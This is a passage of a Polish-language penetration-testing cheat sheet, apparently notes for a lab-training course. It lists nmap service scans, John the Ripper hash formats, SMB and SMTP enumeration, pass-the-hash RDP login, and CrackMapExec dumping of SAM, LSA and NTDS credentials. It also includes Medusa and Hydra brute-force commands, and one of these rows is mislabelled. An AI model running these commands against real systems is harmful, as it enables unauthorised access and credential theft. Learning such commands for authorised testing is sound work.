                            <td>nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5</td>
                        </tr>
                        <tr>
                            <td>--script-updatedb</td>
                            <td>Aktualizacja skryptów nmap</td>
                            <td>sudo nmap --script-updatedb</td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>FTP</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>FTP - skrypty</td>
                            <td>find / -type f -name ftp* 2{`>`}/dev/null | grep scripts</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>FTP - skanowanie infrastruktury przez host</td>
                            <td>nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>SMB</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>SMB - porty</td>
                            <td>nmap 10.129.14.128 -sV -sC -p139,445</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>NFS</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>NFS - porty</td>
                            <td>nmap 10.129.14.128 -p111,2049 -sV -sC</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>NFS - script</td>
                            <td>nmap --script nfs* 10.129.14.128 -sV -p111,2049</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>SMTP</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>SMTP - script</td>
                            <td>nmap 10.129.14.128 -p25 --script smtp-open-relay -v</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>IMAP/ POP3</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>IMAP/ POP3 - footprinting</td>
                            <td>nmap 10.129.14.128 -sV -p110,143,993,995 -sC</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>MySql</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>MySql - scripts</td>
                            <td>nmap 10.129.14.128 -sV -sC -p3306 --script mysql*</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>MSSQL</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>MSSQL - scripts</td>
                            <td>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>MSSQL - metasploit</td>
                            <td>scanner/mssql/mssql_ping</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>RDP</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>RDP - script</td>
                            <td>nmap -sV -sC 10.129.201.248 -p3389 --script rdp*</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td>WinRM</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td>WinRM - footprinting</td>
                            <td>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n</td>
                            <td></td>
                        </tr>
                    </tbody>
                </table>

                <h2>Opcje Wyjścia</h2>

                <table class="table table-striped text-left">
                    <thead>
                        <tr>
                            <th><strong>Nmap Opcja</strong></th>
                            <th><strong>Opis</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>-oA filename</code></td>
                            <td>Przechowuje wyniki we wszystkich dostępnych formatach, zaczynając od nazwy „filename”.</td>
                        </tr>
                        <tr>
                            <td><code>-oN filename</code></td>
                            <td>Przechowuje wyniki w normalnym formacie z nazwą „filename”.</td>
                        </tr>
                        <tr>
                            <td><code>-oG filename</code></td>
                            <td>Przechowuje wyniki w formacie „grepable” z nazwą „filename”.</td>
                        </tr>
                        <tr>
                            <td><code>-oX filename</code></td>
                            <td>Przechowuje wyniki w formacie XML z nazwą „filename”.</td>
                        </tr>
                    </tbody>
                </table>

                <table>
                    <thead>
                        <tr>
                            <th><strong>Status</strong></th>
                            <th><strong>Opis</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>open</code></td>
                            <td>Oznacza to, że połączenie ze skanowanym portem zostało nawiązane. Połączenia te mogą być połączeniami TCP, datagramami UDP, a także powiązaniami SCTP.</td>
                        </tr>
                        <tr>
                            <td><code>closed</code></td>
                            <td>Gdy port jest wyświetlany jako zamknięty, protokół TCP wskazuje, że otrzymany przez nas pakiet zawiera flagę RST. Tę metodę skanowania można również wykorzystać do ustalenia, czy nasz cel żyje, czy nie.</td>
                        </tr>
                        <tr>
                            <td><code>filtered</code></td>
                            <td>Nmap nie może poprawnie określić, czy przeskanowany port jest otwarty, czy zamknięty, ponieważ albo od celu nie została zwrócona żadna odpowiedź dla portu, albo otrzymaliśmy od celu kod błędu.</td>
                        </tr>
                        <tr>
                            <td><code>unfiltered</code></td>
                            <td>Ten stan portu występuje tylko podczas skanowania TCP-ACK i oznacza, że ​​port jest dostępny, ale nie można określić, czy jest otwarty, czy zamknięty.</td>
                        </tr>
                        <tr>
                            <td><code>open|filtered</code></td>
                            <td>Jeśli nie otrzymamy odpowiedzi dla konkretnego portu, Nmap ustawi go na ten stan. Oznacza to, że zapora sieciowa lub filtr pakietów mogą chronić port.</td>
                        </tr>
                        <tr>
                            <td><code>closed|filtered</code></td>
                            <td>Ten stan występuje tylko podczas skanowań bezczynności identyfikatora IP i wskazuje, że nie można było określić, czy skanowany port jest zamknięty, czy filtrowany przez zaporę ogniową.</td>
                        </tr>
                    </tbody>
                </table>

            </details>

            <details>
                <summary>John the Ripper</summary>
                <table>
                    <thead>
                        <tr>
                        <th><strong>Hash Format</strong></th>
                        <th><strong>Example Command</strong></th>
                        <th><strong>Description</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                        <td>afs</td>
                        <td><code>john --format=afs hashes_to_crack.txt</code></td>
                        <td>AFS (Andrew File System) password hashes</td>
                        </tr>
                        <tr>
                        <td>bfegg</td>
                        <td><code>john --format=bfegg hashes_to_crack.txt</code></td>
                        <td>bfegg hashes used in Eggdrop IRC bots</td>
                        </tr>
                        <tr>
                        <td>bf</td>
                        <td><code>john --format=bf hashes_to_crack.txt</code></td>
                        <td>Blowfish-based crypt(3) hashes</td>
                        </tr>
                        <tr>
                        <td>bsdi</td>
                        <td><code>john --format=bsdi hashes_to_crack.txt</code></td>
                        <td>BSDi crypt(3) hashes</td>
                        </tr>
                        <tr>
                        <td>crypt(3)</td>
                        <td><code>john --format=crypt hashes_to_crack.txt</code></td>
                        <td>Traditional Unix crypt(3) hashes</td>
                        </tr>
                        <tr>
                        <td>des</td>
                        <td><code>john --format=des hashes_to_crack.txt</code></td>
                        <td>Traditional DES-based crypt(3) hashes</td>
                        </tr>
                        <tr>
                        <td>dmd5</td>
                        <td><code>john --format=dmd5 hashes_to_crack.txt</code></td>
                        <td>DMD5 (Dragonfly BSD MD5) password hashes</td>
                        </tr>
                        <tr>
                        <td>dominosec</td>
                        <td><code>john --format=dominosec hashes_to_crack.txt</code></td>
                        <td>IBM Lotus Domino 6/7 password hashes</td>
                        </tr>
                        <tr>
                        <td>EPiServer SID hashes</td>
                        <td><code>john --format=episerver hashes_to_crack.txt</code></td>
                        <td>EPiServer SID (Security Identifier) password hashes</td>
                        </tr>
                        <tr>
                        <td>hdaa</td>
                        <td><code>john --format=hdaa hashes_to_crack.txt</code></td>
                        <td>hdaa password hashes used in Openwall GNU/Linux</td>
                        </tr>
                        <tr>
                        <td>hmac-md5</td>
                        <td><code>john --format=hmac-md5 hashes_to_crack.txt</code></td>
                        <td>hmac-md5 password hashes</td>
                        </tr>
                        <tr>
                        <td>hmailserver</td>
                        <td><code>john --format=hmailserver hashes_to_crack.txt</code></td>
                        <td>hmailserver password hashes</td>
                        </tr>
                        <tr>
                        <td>ipb2</td>
                        <td><code>john --format=ipb2 hashes_to_crack.txt</code></td>
                        <td>Invision Power Board 2 password hashes</td>
                        </tr>
                        <tr>
                        <td>krb4</td>
                        <td><code>john --format=krb4 hashes_to_crack.txt</code></td>
                        <td>Kerberos 4 password hashes</td>
                        </tr>
                        <tr>
                        <td>krb5</td>
                        <td><code>john --format=krb5 hashes_to_crack.txt</code></td>
                        <td>Kerberos 5 password hashes</td>
                        </tr>
                        <tr>
                        <td>LM</td>
                        <td><code>john --format=LM hashes_to_crack.txt</code></td>
                        <td>LM (Lan Manager) password hashes</td>
                        </tr>
                        <tr>
                        <td>lotus5</td>
                        <td><code>john --format=lotus5 hashes_to_crack.txt</code></td>
                        <td>Lotus Notes/Domino 5 password hashes</td>
                        </tr>
                        <tr>
                        <td>mscash</td>
                        <td><code>john --format=mscash hashes_to_crack.txt</code></td>
                        <td>MS Cache password hashes</td>
                        </tr>
                        <tr>
                        <td>mscash2</td>
                        <td><code>john --format=mscash2 hashes_to_crack.txt</code></td>
                        <td>MS Cache v2 password hashes</td>
                        </tr>
                        <tr>
                        <td>mschapv2</td>
                        <td><code>john --format=mschapv2 hashes_to_crack.txt</code></td>
                        <td>MS CHAP v2 password hashes</td>
                        </tr>
                        <tr>
                        <td>mskrb5</td>
                        <td><code>john --format=mskrb5 hashes_to_crack.txt</code></td>
                        <td>MS Kerberos 5 password hashes</td>
                        </tr>
                        <tr>
                        <td>mssql05</td>
                        <td><code>john --format=mssql05 hashes_to_crack.txt</code></td>
                        <td>MS SQL 2005 password hashes</td>
                        </tr>
                        <tr>
                        <td>mssql</td>
                        <td><code>john --format=mssql hashes_to_crack.txt</code></td>
                        <td>MS SQL password hashes</td>
                        </tr>
                        <tr>
                        <td>mysql-fast</td>
                        <td><code>john --format=mysql-fast hashes_to_crack.txt</code></td>
                        <td>MySQL fast password hashes</td>
                        </tr>
                        <tr>
                        <td>mysql</td>
                        <td><code>john --format=mysql hashes_to_crack.txt</code></td>
                        <td>MySQL password hashes</td>
                        </tr>
                        <tr>
                        <td>mysql-sha1</td>
                        <td><code>john --format=mysql-sha1 hashes_to_crack.txt</code></td>
                        <td>MySQL SHA1 password hashes</td>
                        </tr>
                        <tr>
                        <td>NETLM</td>
                        <td><code>john --format=netlm hashes_to_crack.txt</code></td>
                        <td>NETLM (NT LAN Manager) password hashes</td>
                        </tr>
                        <tr>
                        <td>NETLMv2</td>
                        <td><code>john --format=netlmv2 hashes_to_crack.txt</code></td>
                        <td>NETLMv2 (NT LAN Manager version 2) password hashes</td>
                        </tr>
                        <tr>
                        <td>NETNTLM</td>
                        <td><code>john --format=netntlm hashes_to_crack.txt</code></td>
                        <td>NETNTLM (NT LAN Manager) password hashes</td>
                        </tr>
                        <tr>
                        <td>NETNTLMv2</td>
                        <td><code>john --format=netntlmv2 hashes_to_crack.txt</code></td>
                        <td>NETNTLMv2 (NT LAN Manager version 2) password hashes</td>
                        </tr>
                        <tr>
                        <td>NEThalfLM</td>
                        <td><code>john --format=nethalflm hashes_to_crack.txt</code></td>
                        <td>NEThalfLM (NT LAN Manager) password hashes</td>
                        </tr>
                        <tr>
                        <td>md5ns</td>
                        <td><code>john --format=md5ns hashes_to_crack.txt</code></td>
                        <td>md5ns (MD5 namespace) password hashes</td>
                        </tr>
                        <tr>
                        <td>nsldap</td>
                        <td><code>john --format=nsldap hashes_to_crack.txt</code></td>
                        <td>nsldap (OpenLDAP SHA) password hashes</td>
                        </tr>
                        <tr>
                        <td>ssha</td>
                        <td><code>john --format=ssha hashes_to_crack.txt</code></td>
                        <td>ssha (Salted SHA) password hashes</td>
                        </tr>
                        <tr>
                        <td>NT</td>
                        <td><code>john --format=nt hashes_to_crack.txt</code></td>
                        <td>NT (Windows NT) password hashes</td>
                        </tr>
                        <tr>
                        <td>openssha</td>
                        <td><code>john --format=openssha hashes_to_crack.txt</code></td>
                        <td>OPENSSH private key password hashes</td>
                        </tr>
                        <tr>
                        <td>oracle11</td>
                        <td><code>john --format=oracle11 hashes_to_crack.txt</code></td>
                        <td>Oracle 11 password hashes</td>
                        </tr>
                        <tr>
                        <td>oracle</td>
                        <td><code>john --format=oracle hashes_to_crack.txt</code></td>
                        <td>Oracle password hashes</td>
                        </tr>
                        <tr>
                        <td>pdf</td>
                        <td><code>john --format=pdf hashes_to_crack.txt</code></td>
                        <td>PDF (Portable Document Format) password hashes</td>
                        </tr>
                        <tr>
                        <td>phpass-md5</td>
                        <td><code>john --format=phpass-md5 hashes_to_crack.txt</code></td>
                        <td>PHPass-MD5 (Portable PHP password hashing framework) password hashes</td>
                        </tr>
                        <tr>
                        <td>phps</td>
                        <td><code>john --format=phps hashes_to_crack.txt</code></td>
                        <td>PHPS password hashes</td>
                        </tr>
                        <tr>
                        <td>pix-md5</td>
                        <td><code>john --format=pix-md5 hashes_to_crack.txt</code></td>
                        <td>Cisco PIX MD5 password hashes</td>
                        </tr>
                        <tr>
                        <td>po</td>
                        <td><code>john --format=po hashes_to_crack.txt</code></td>
                        <td>Po (Sybase SQL Anywhere) password hashes</td>
                        </tr>
                        <tr>
                        <td>rar</td>
                        <td><code>john --format=rar hashes_to_crack.txt</code></td>
                        <td>RAR (WinRAR) password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-md4</td>
                        <td><code>john --format=raw-md4 hashes_to_crack.txt</code></td>
                        <td>Raw MD4 password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-md5</td>
                        <td><code>john --format=raw-md5 hashes_to_crack.txt</code></td>
                        <td>Raw MD5 password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-md5-unicode</td>
                        <td><code>john --format=raw-md5-unicode hashes_to_crack.txt</code></td>
                        <td>Raw MD5 Unicode password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-sha1</td>
                        <td><code>john --format=raw-sha1 hashes_to_crack.txt</code></td>
                        <td>Raw SHA1 password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-sha224</td>
                        <td><code>john --format=raw-sha224 hashes_to_crack.txt</code></td>
                        <td>Raw SHA224 password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-sha256</td>
                        <td><code>john --format=raw-sha256 hashes_to_crack.txt</code></td>
                        <td>Raw SHA256 password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-sha384</td>
                        <td><code>john --format=raw-sha384 hashes_to_crack.txt</code></td>
                        <td>Raw SHA384 password hashes</td>
                        </tr>
                        <tr>
                        <td>raw-sha512</td>
                        <td><code>john --format=raw-sha512 hashes_to_crack.txt</code></td>
                        <td>Raw SHA512 password hashes</td>
                        </tr>
                        <tr>
                        <td>salted-sha</td>
                        <td><code>john --format=salted-sha hashes_to_crack.txt</code></td>
                        <td>Salted SHA password hashes</td>
                        </tr>
                        <tr>
                        <td>sapb</td>
                        <td><code>john --format=sapb hashes_to_crack.txt</code></td>
                        <td>SAP CODVN B (BCODE) password hashes</td>
                        </tr>
                        <tr>
                        <td>sapg</td>
                        <td><code>john --format=sapg hashes_to_crack.txt</code></td>
                        <td>SAP CODVN G (PASSCODE) password hashes</td>
                        </tr>
                        <tr>
                        <td>sha1-gen</td>
                        <td><code>john --format=sha1-gen hashes_to_crack.txt</code></td>
                        <td>Generic SHA1 password hashes</td>
                        </tr>
                        <tr>
                        <td>skey</td>
                        <td><code>john --format=skey hashes_to_crack.txt</code></td>
                        <td>S/Key (One-time password) hashes</td>
                        </tr>
                        <tr>
                        <td>ssh</td>
                        <td><code>john --format=ssh hashes_to_crack.txt</code></td>
                        <td>SSH (Secure Shell) password hashes</td>
                        </tr>
                        <tr>
                        <td>sybasease</td>
                        <td><code>john --format=sybasease hashes_to_crack.txt</code></td>
                        <td>Sybase ASE password hashes</td>
                        </tr>
                        <tr>
                        <td>xsha</td>
                        <td><code>john --format=xsha hashes_to_crack.txt</code></td>
                        <td>xsha (Extended SHA) password hashes</td>
                        </tr>
                        <tr>
                        <td>zip</td>
                        <td><code>john --format=zip hashes_to_crack.txt</code></td>
                        <td>ZIP (WinZip) password hashes</td>
                        </tr>
                    </tbody>
                </table>

                <div className='waring'>
                    <p>{`<tool> <file_to_crack> > file.hash`}</p>
                    <p>pdf2john server_doc.pdf {`>`} server_doc.hash</p>
                    <p>john --wordlist={`<wordlist.txt>`} server_doc.hash </p>
                </div>

                <table>
                    <thead>
                        <tr>
                        <th><strong>Narzędzie</strong></th>
                        <th><strong>Opis</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                        <td><code>pdf2john</code></td>
                        <td>Converts PDF documents for John</td>
                        </tr>
                        <tr>
                        <td><code>ssh2john</code></td>
                        <td>Converts SSH private keys for John</td>
                        </tr>
                        <tr>
                        <td><code>mscash2john</code></td>
                        <td>Converts MS Cash hashes for John</td>
                        </tr>
                        <tr>
                        <td><code>keychain2john</code></td>
                        <td>Converts OS X keychain files for John</td>
                        </tr>
                        <tr>
                        <td><code>rar2john</code></td>
                        <td>Converts RAR archives for John</td>
                        </tr>
                        <tr>
                        <td><code>pfx2john</code></td>
                        <td>Converts PKCS#12 files for John</td>
                        </tr>
                        <tr>
                        <td><code>truecrypt_volume2john</code></td>
                        <td>Converts TrueCrypt volumes for John</td>
                        </tr>
                        <tr>
                        <td><code>keepass2john</code></td>
                        <td>Converts KeePass databases for John</td>
                        </tr>
                        <tr>
                        <td><code>vncpcap2john</code></td>
                        <td>Converts VNC PCAP files for John</td>
                        </tr>
                        <tr>
                        <td><code>putty2john</code></td>
                        <td>Converts PuTTY private keys for John</td>
                        </tr>
                        <tr>
                        <td><code>zip2john</code></td>
                        <td>Converts ZIP archives for John</td>
                        </tr>
                        <tr>
                        <td><code>hccap2john</code></td>
                        <td>Converts WPA/WPA2 handshake captures for John</td>
                        </tr>
                        <tr>
                        <td><code>office2john</code></td>
                        <td>Converts MS Office documents for John</td>
                        </tr>
                        <tr>
                        <td><code>wpa2john</code></td>
                        <td>Converts WPA/WPA2 handshakes for John</td>
                        </tr>
                    </tbody>
                </table>
            </details>
                        
            <details>
                <summary>FTP</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>openssl s_client -connect {'<IP>'} -starttls ftp</td>
                            <td>Połącz z ftp</td>
                        </tr>
                        <tr>
                            <td>ftp {'<IP>'}</td>
                            <td>Połącz z ftp</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>SMB</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>smbclient -N -L //10.129.14.128</td>
                            <td>Zwraca strukturę folderów</td>
                        </tr>
                        <tr>
                            <td>smbclient -U {'<USER / guest/ annonymus>'} \\\\{`<IP>`}\\{`Folder`}</td>
                            <td>Połącz z smb</td>
                        </tr>
  
                    </tbody>
                </table>
            </details>

            <details>
                <summary>rpcclient - SMB</summary>
                <p className='important'>rpcclient -U {'<User>'} {'<IP>'}</p>
                <table class="table table-striped text-left"><thead><tr><th><strong>Zapytanie</strong></th><th><strong>Opis</strong></th></tr></thead><tbody><tr><td><code>srvinfo</code></td><td>Informacje o serwerze</td></tr><tr><td><code>enumdomains</code></td><td>Wylicz wszystkie domeny wdrożone w sieci.</td></tr><tr><td><code>querydominfo</code></td><td>Zawiera informacje o domenie, serwerze i użytkowniku wdrożonych domen.</td></tr><tr><td><code>netshareenumall</code></td><td>Wylicza wszystkie dostępne udziały.</td></tr><tr><td><code>netsharegetinfo &lt;share&gt;</code></td><td>Zawiera informacje o konkretnym udziale.</td></tr><tr><td><code>enumdomusers</code></td><td>Wylicza wszystkich użytkowników domeny.</td></tr><tr><td><code>queryuser &lt;RID&gt;</code></td><td>Zawiera informacje o konkretnym użytkowniku.</td></tr></tbody></table>
            </details>

            <details>
                <summary>SMTP</summary>
                <p>telnet {'IP'} {'<PORT (25)>'}</p>
                <table><thead><tr><th><strong>Komenda</strong></th><th><strong>Opis</strong></th></tr></thead><tbody><tr><td><code>AUTH PLAIN</code></td><td>AUTH to rozszerzenie usługi używane do uwierzytelniania klienta.</td></tr><tr><td><code>HELO</code></td><td>Klient loguje się podając swoją nazwę komputera i tym samym rozpoczyna sesję.</td></tr><tr><td><code>MAIL FROM</code></td><td>Klient wskazuje nadawcę wiadomości e-mail.</td></tr><tr><td><code>RCPT TO</code></td><td>Klient wyznacza odbiorcę wiadomości e-mail.</td></tr><tr><td><code>DATA</code></td><td>Klient inicjuje transmisję wiadomości e-mail.</td></tr><tr><td><code>RSET</code></td><td>Klient przerywa rozpoczętą transmisję, ale utrzymuje połączenie między klientem a serwerem.</td></tr><tr><td><code>VRFY</code></td><td>Klient sprawdza, czy skrzynka pocztowa jest dostępna do przesłania wiadomości.</td></tr><tr><td><code>EXPN</code></td><td>Za pomocą tego polecenia klient sprawdza również, czy skrzynka pocztowa jest dostępna do przesyłania wiadomości.</td></tr><tr><td><code>NOOP</code></td><td>Klient żąda odpowiedzi od serwera, aby zapobiec rozłączeniu z powodu przekroczenia limitu czasu.</td></tr><tr><td><code>QUIT</code></td><td>Klient kończy sesję.</td></tr></tbody></table>
            </details>

            <details>
                <summary>Smtp user enum</summary>
                <p>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</p>
            </details>


            <details>
                <summary>POP3</summary>
                <p>openssl s_client -connect {'<IP>'}:pop3s</p>
                <table class="table table-striped text-left">
                    <thead>
                        <tr>
                        <th><strong>Komenda</strong></th>
                        <th><strong>Opis</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                        <td><code>USER username</code></td>
                        <td>Identyfikuje użytkownika.</td>
                        </tr>
                        <tr>
                        <td><code>PASS password</code></td>
                        <td>Uwierzytelnianie użytkownika za pomocą jego hasła.</td>
                        </tr>
                        <tr>
                        <td><code>STAT</code></td>
                        <td>Żąda podania liczby zapisanych e-maili z serwera.</td>
                        </tr>
                        <tr>
                        <td><code>LIST</code></td>
                        <td>Żąda od serwera liczby i rozmiaru wszystkich e-maili.</td>
                        </tr>
                        <tr>
                        <td><code>RETR id</code></td>
                        <td>Żąda, aby serwer dostarczył żądaną wiadomość e-mail według identyfikatora.</td>
                        </tr>
                        <tr>
                        <td><code>DELE id</code></td>
                        <td>Żąda, aby serwer usunął żądaną wiadomość e-mail według identyfikatora.</td>
                        </tr>
                        <tr>
                        <td><code>CAPA</code></td>
                        <td>Żąda serwera, aby wyświetlić możliwości serwera.</td>
                        </tr>
                        <tr>
                        <td><code>RSET</code></td>
                        <td>Żąda serwera, aby zresetował przesłane informacje.</td>
                        </tr>
                        <tr>
                        <td><code>QUIT</code></td>
                        <td>Zamyka połączenie z serwerem POP3.</td>
                        </tr>
                    </tbody>
                </table>
            </details>
            
            <details>
                <summary>IMAP</summary>
                <p>openssl s_client -connect {'<IP>'}:imaps</p>
                <table>
                    <thead>
                        <tr>
                        <th><strong>Komenda</strong></th>
                        <th><strong>Opie</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                        <td><code>1 LOGIN username password</code></td>
                        <td>Logowanie użytkownika.</td>
                        </tr>
                        <tr>
                        <td><code>1 LIST "" *</code></td>
                        <td>Wyświetla listę wszystkich katalogów.</td>
                        </tr>
                        <tr>
                        <td><code>1 CREATE "INBOX"</code></td>
                        <td>Tworzy skrzynkę pocztową o określonej nazwie.</td>
                        </tr>
                        <tr>
                        <td><code>1 DELETE "INBOX"</code></td>
                        <td>Usuwa skrzynkę pocztową.</td>
                        </tr>
                        <tr>
                        <td><code>1 RENAME "ToRead" "Important"</code></td>
                        <td>Zmienia nazwę skrzynki pocztowej.</td>
                        </tr>
                        <tr>
                        <td><code>1 LSUB "" *</code></td>
                        <td>Zwraca podzbiór nazw ze zbioru nazw, który Użytkownik zadeklarował jako <code className="important">aktywny</code> lub <code className="important">subskrybowany</code>.</td>
                        </tr>
                        <tr>
                        <td><code>1 SELECT INBOX</code></td>
                        <td>Wybiera skrzynkę pocztową, aby można było uzyskać dostęp do wiadomości w skrzynce pocztowej.</td>
                        </tr>
                        <tr>
                        <td><code>1 UNSELECT INBOX</code></td>
                        <td>Opuszcza wybraną skrzynkę pocztową.</td>
                        </tr>
                        <tr>
                        <td><code>1 FETCH &lt;ID&gt; all</code></td>
                        <td>Pobiera dane powiązane z wiadomością w skrzynce pocztowej.</td>
                        </tr>
                        <tr>
                        <td><code>1 CLOSE</code></td>
                        <td>Usuwa wszystkie wiadomości z ustawioną flagą <code>Deleted</code>.</td>
                        </tr>
                        <tr>
                        <td><code>1 LOGOUT</code></td>
                        <td>Zamyka połączenie z serwerem IMAP.</td>
                        </tr>
                    </tbody>
                </table>
            </details>
            
            <details>
                <summary>xfreerdp</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>xfreerdp /u:{'<USER>'} /p:{'<Password>'} /v:{'<IP>'} </td>
                            <td>Otworzenie RDP</td>
                        </tr>
                        <tr>
                            <td>xfreerdp /u:{'<USER>'} /pth:{'<HASH>'} /v:{'<IP>'} </td>
                            <td>Otworzenie RDP przez Hash</td>
                        </tr>
                        <tr>
                            <td>xfreerdp /u:{'<USER>'} /p:{'<PASSWORD>'} /v:{'<IP>'} /cert:ignore +drive:smbfolder,{'<Path to share smb>'} </td>
                            <td>Otworzenie RDP z udostępnionym smb</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>username anarchy</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>username-anarchy Jane Smith</td>
                            <td>Generowanie możliwych nazw usera dla 'Jane Smith'</td>
                        </tr>

                        <tr>
                            <td>username-anarchy -i names.txt</td>
                            <td>Generowanie możliwych nazw usera dla userów z pliku</td>
                        </tr>
                        <tr>
                            <td>username-anarchy -l</td>
                            <td>Wyświetl listę pluginów</td>
                        </tr>
                        <tr>
                            <td>username-anarchy -f format1,format2</td>
                            <td>Użyj konkretnych pluginów</td>
                        </tr>
                        <tr>
                            <td>username-anarchy -@ example.com</td>
                            <td>Użyj suffix @example.com dla userów</td>
                        </tr>
 
                    </tbody>
                </table>
            </details>


            <details>
                <summary>Crackmapexec</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td><code>crackmapexec winrm &lt;ip&gt; -u user.list -p password.list</code></td>
                        <td>Używa CrackMapExec przez WinRM do próby brutalnego wymuszenia nazw użytkowników i haseł określonych hostowanych na obiekcie docelowym.</td>
                        </tr>
                        <tr>
                        <td><code>crackmapexec smb &lt;ip&gt; -u "user" -p "password" --shares</code></td>
                        <td>Używa CrackMapExec do wyliczenia udziałów SMB na obiekcie docelowym przy użyciu określonego zestawu poświadczeń.</td>
                        </tr>
                        <tr>
                        <td><code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</code></td>
                        <td>Używa CrackMapExec w połączeniu z poświadczeniami administratora do zrzutu skrótów haseł przechowywanych w SAM przez sieć.</td>
                        </tr>
                        <tr>
                        <td><code>crackmapexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</code></td>
                        <td>Używa CrackMapExec w połączeniu z uprawnieniami administratora do zrzucania sekretów LSA przez sieć. W ten sposób można uzyskać dane uwierzytelniające w postaci zwykłego tekstu.</td>
                        </tr>
                        <tr>
                        <td><code>crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</code></td>
                        <td>Używa CrackMapExec w połączeniu z uprawnieniami administratora do zrzucania skrótów z pliku ntds przez sieć.</td>
                        </tr>
                        <tr>
                        <td><code>crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --rid-brute</code></td>
                        <td>Używa brutalnie CrackMapExec do zrzucania userów.</td>
                        </tr>
                        <tr>
                        <td><code>crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --users</code></td>
                        <td>Używa CrackMapExec do zrzucania userów.</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>Medusa</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp</td>
                            <td>Brute ftp</td>
                        </tr>
                        <tr>
                            <td>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ssh</td>
                            <td>Brute ssh</td>
                        </tr>
                        <tr>
                            <td>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ssh -f</td>
                            <td>Brute ssh, zatrzymaj gdy znajdzie</td>
                        </tr>
                        <tr>
                            <td>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M rdp</td>
                            <td>Brute rdp</td>
                        </tr>
                        <tr>
                            <td>medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M http -m GET</td>
                            <td>Brute rdp</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>Hydra</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>hydra -L usernames.txt -p {'<Passord>'} {'<IP>'} rdp</td>
                            <td>Brute rdp</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt ftp://{'<IP>'}</td>
                            <td>Brute ftp</td>
                        </tr>
                        <tr>
